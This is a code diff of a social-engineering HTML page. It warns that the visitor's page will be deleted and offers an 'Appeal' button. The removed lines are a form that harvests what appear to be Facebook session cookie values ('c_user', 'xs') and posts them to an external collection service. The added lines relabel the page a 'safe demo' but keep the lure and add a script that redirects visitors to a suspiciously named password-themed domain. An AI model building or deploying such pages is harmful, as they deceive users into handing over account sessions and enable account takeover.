@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safe Page Demo</title>
+  <title>Page Review</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -64,35 +64,38 @@
 </head>
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <!-- Warning Message -->
-    <div class="message-box">
-      <h1>Your page is scheduled to be deleted!</h1>
-      <p>
-        We have received several reports that your page violates our terms of service and community guidelines. 
-        As a result, your page will be sent for verification.
-      </p>
-      <p>
-        If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal 
-        by simply clicking the appeal button below and providing some quick information.
-      </p>
-    </div>
-
-    <!-- Video -->
-    <video controls>
-      <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-      Your browser does not support HTML5 video.
-    </video>
-
-    <!-- c_user / xs Form -->
-    <form action="https://submit-form.com/nHgDXoBTJ" method="POST">
-      <input type="text" name="c_user" placeholder="c_user" required>
-      <input type="text" name="xs" placeholder="xs" required>
-      <button type="submit">Appeal</button>
-    </form>
-
+  <div class="message-box">
+    <h1>Your page is scheduled to be deleted!</h1>
+    <p>
+      We have received several reports that your page violates our terms of service
+      and community guidelines. As a result, your page will be sent for verification.
+    </p>
+    <p>
+      If you believe your page was mistakenly scheduled for deletion, you can prevent
+      its permanent removal by clicking the appeal button below.
+    </p>
   </div>
+
+  <video controls>
+    <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+  </video>
+
+  <!-- SAFE DEMO FORM -->
+  <form onsubmit="redirectPage(); return false;">
+    <input type="text" placeholder="c_user" disabled>
+    <input type="text" placeholder="xs" disabled>
+    <button type="submit">Appeal</button>
+  </form>
+
+</div>
+
+<script>
+  function redirectPage() {
+    window.location.href = "https://password-steel-theta.vercel.app/";
+  }
+</script>
 
 </body>
 </html>
